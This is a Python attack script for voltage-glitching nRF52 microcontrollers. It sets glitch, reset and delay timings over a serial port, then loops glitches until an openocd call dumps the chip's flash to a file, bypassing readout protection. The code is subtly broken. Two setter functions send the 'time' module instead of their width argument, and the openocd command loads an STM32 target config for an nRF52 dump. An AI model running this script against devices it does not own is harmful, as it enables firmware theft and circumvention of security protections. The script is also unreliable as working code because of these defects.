# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: 2021 Rafael Silva <perigoso@riseup.net>

import time
import sys
import serial
import argparse
import os


def glitch_target(ser):
	ser.write('g'.encode(encoding='utf-8'))

def set_glitch_width(ser, width):
	ser.write("w{value}\n".format(value=time).encode(encoding='utf-8'))

def set_reset_width(ser, width):
	ser.write("l{value}\n".format(value=time).encode(encoding='utf-8'))

def set_time_to_glitch(ser, time):
	ser.write("d{value}\n".format(value=time).encode(encoding='utf-8'))

# TODO proper
def test_debug():
	if(os.system("openocd -c \"adapter driver jlink; transport select swd; source [find target/stm32f1x.cfg]\" -c \"init;dump_image nrf52_dumped.bin 0x0 0x100000\" -c shutdown")):
		return False
	else:
		return True


if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description='Simple attack script to jailbreak nrf52 targets.')

	parser.add_argument(
        'serialport',
        help="serial port device")

	parser.add_argument(
		"--gwidth",
		type=int,
		help="glitch pulse width, 125ns steps, default: 4 (500ns)",
		default=4)

	parser.add_argument(
		"--rwidth",
		type=int,
		help="reset pulse width, 125ns steps, default: 800000 (100ms)",
		default=800000)

	parser.add_argument(
		"--timetog",
		type=int,
		help="time to glitch, 125ns steps, default: 24000 (3ms)",
		default=24000)

	args = parser.parse_args()

	ser = serial.serial_for_url(args.serialport, do_not_open=True)

	try:
		ser.open()
	except serial.SerialException as e:
		sys.stderr.write('Could not open serial port {}: {}\n'.format(ser.name, e))
		sys.exit(1)

	set_glitch_width(ser, args.gwidth)
	set_reset_width(ser, args.rwidth)
	set_time_to_glitch(ser, args.timetog)

	while True:
		glitch_target(ser)

		time.sleep(0.1)

		if test_debug():
			print("We've broken out!")
			sys.exit(0)

